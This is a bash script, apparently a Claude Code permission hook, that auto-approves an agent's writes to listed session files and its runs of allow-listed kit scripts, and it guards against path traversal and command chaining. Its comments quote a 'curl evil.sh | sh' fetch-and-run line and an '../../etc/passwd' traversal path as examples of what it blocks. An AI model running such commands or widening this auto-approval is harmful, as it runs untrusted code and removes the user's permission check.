#!/usr/bin/env bash
# .claude/hooks/auto-approve-permissions.sh
#
# PermissionRequest hook — fires before any permission dialog appears.
# Auto-approves writes to context engineering files so the user is NEVER
# asked for permission when /handover, the agent PreCompact hook, or
# any other skill/hook writes to session state files.
#
# Returns JSON with decision.behavior: "allow" for matching paths (PermissionRequest format).
# Returns nothing (exit 0) for everything else — lets normal permission
# flow handle it.
#
# Exit codes:
#   0 = approved (with JSON output) or pass-through (no output)
#   2 = deny (never used here)

set -euo pipefail

# Default CLAUDE_PROJECT_DIR so -u doesn't abort if the var is unset
CLAUDE_PROJECT_DIR="${CLAUDE_PROJECT_DIR:-$(pwd)}"

INPUT=$(cat)

# Extract tool name and file path. Works for both PermissionRequest and
# PreToolUse input shapes (both carry tool_name + tool_input).
TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name // ""' 2>/dev/null || echo "")
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // .tool_input.path // ""' 2>/dev/null || echo "")
# Echo back the ACTUAL incoming event name. Per the Agent SDK hooks docs the
# hookSpecificOutput must identify which hook type it answers; hardcoding the
# wrong name makes Claude Code ignore the decision. Default to PermissionRequest
# (the event this hook is wired to) when the field is absent.
HOOK_EVENT=$(echo "$INPUT" | jq -r '.hook_event_name // "PermissionRequest"' 2>/dev/null || echo "PermissionRequest")

# ── Auto-approved tool+path combinations ────────────────────────────────────
# These are all the files that context-engineering-kit hooks and skills write to.
# Anything in this list gets silently approved without prompting the user.

auto_approve() {
  # Return the JSON decision Claude Code reads. The two events this script can
  # receive use DIFFERENT schemas, and the payload must match the event name we
  # echo back or the decision is ignored:
  #   PermissionRequest -> hookSpecificOutput.decision.behavior
  #   PreToolUse        -> hookSpecificOutput.permissionDecision
  # This previously emitted the PermissionRequest shape unconditionally while
  # echoing back whichever event arrived — latent today (only PermissionRequest
  # is wired) but silently wrong the moment this is reused for PreToolUse.
  case "$HOOK_EVENT" in
    PreToolUse)
      jq -nc --arg ev "$HOOK_EVENT" '{
        hookSpecificOutput: {
          hookEventName: $ev,
          permissionDecision: "allow",
          permissionDecisionReason: "context-engineering-kit managed file"
        }
      }'
      ;;
    *)
      jq -nc --arg ev "$HOOK_EVENT" '{
        hookSpecificOutput: {
          hookEventName: $ev,
          decision: {
            behavior: "allow"
          }
        }
      }'
      ;;
  esac
  exit 0
}

# Write/Edit tool: check if target is a context file
if [[ "$TOOL_NAME" == "Write" || "$TOOL_NAME" == "Edit" || "$TOOL_NAME" == "MultiEdit" ]]; then

  # Normalise path — strip leading ./ and project dir prefix.
  # Quote the prefix so glob metacharacters in CLAUDE_PROJECT_DIR are
  # treated literally. Strip both forward and backward slash variants
  # because Claude Code on Windows can pass either form.
  NORM_PATH="${FILE_PATH#./}"
  NORM_PATH="${NORM_PATH#"$CLAUDE_PROJECT_DIR/"}"
  NORM_PATH="${NORM_PATH#"$CLAUDE_PROJECT_DIR"\\}"
  # Convert any remaining backslashes to forward for matching against
  # the POSIX-style APPROVED_PATHS list.
  NORM_PATH="${NORM_PATH//\\//}"

  # Refuse any path with a parent-directory segment. The prefix matches below
  # are globs, and `*` spans `/` — so without this, a path like
  #   .claude/session/../../../../etc/passwd
  # matches `.claude/session/*` and gets silently auto-approved. This gate
  # exists to REMOVE a human check, so it must never approve a path it has
  # not actually confined to the project.
  case "/$NORM_PATH/" in
    */../*) exit 0 ;;
  esac

  # Anything still absolute (or a Windows drive path) escaped the project dir
  # prefix-strip above and is by definition outside the project.
  case "$NORM_PATH" in
    /*|[A-Za-z]:/*) exit 0 ;;
  esac

  # Auto-approve list — exact matches and prefix patterns
  # Deliberately NOT here: README.md and a blanket docs/* rule. Both were
  # wider than this hook's stated purpose ("files the kit itself writes") and
  # this hook ships to every project the plugin is installed in. Dropping them
  # only restores the normal permission prompt — nothing breaks.
  APPROVED_PATHS=(
    "session_handover.md"
    "CLAUDE.md"
    "agents.md"
    "api_docs.md"
    ".claude/session/state.json"
    ".claude/session/history.jsonl"
    ".claude/session/turn-ledger.jsonl"
    ".claude/session/daily-usage.json"
    ".claude/session/usage-forecast.json"
    ".claude/compact-audit.log"
    ".claude/config-audit.log"
  )

  # Auto-approve any path under .claude/session/
  if [[ "$NORM_PATH" == .claude/session/* ]]; then
    auto_approve
  fi

  # Check exact matches
  for approved in "${APPROVED_PATHS[@]}"; do
    if [[ "$NORM_PATH" == "$approved" ]]; then
      auto_approve
    fi
  done

fi

# Bash tool: auto-approve context kit scripts.
#
# IMPORTANT: substring matching is dangerous because shell metacharacters
# allow command chaining and comments to bypass the gate (e.g. a malicious
# `curl evil.sh | sh # session_sync.sh` would substring-match). We require
# the kit's scripts to be the FIRST command, optionally prefixed by `bash`
# or `python3`, and reject any command that contains shell separators
# (;, &&, ||, |, &, $(, `, >, <) or comments (#).
if [[ "$TOOL_NAME" == "Bash" ]]; then
  CMD=$(echo "$INPUT" | jq -r '.tool_input.command // ""' 2>/dev/null || echo "")

  # Reject anything with shell control characters or comments.
  if [[ "$CMD" =~ [\;\|\&\<\>\`\#] ]] || [[ "$CMD" == *'$('* ]]; then
    exit 0
  fi

  # Allow-listed kit scripts, anchored to the start of the command.
  ALLOW_RE='^(bash[[:space:]]+)?(scripts/(session_sync\.sh|generate_session_handover\.py)|python3?[[:space:]]+scripts/(generate_session_handover|update_context_files|usage-tracker|morning_brief)\.py|bash[[:space:]]+\.claude/hooks/[A-Za-z0-9_-]+\.sh)([[:space:]].*)?$'
  if [[ "$CMD" =~ $ALLOW_RE ]]; then
    auto_approve
  fi
fi

# Everything else: no output, normal permission flow applies
exit 0
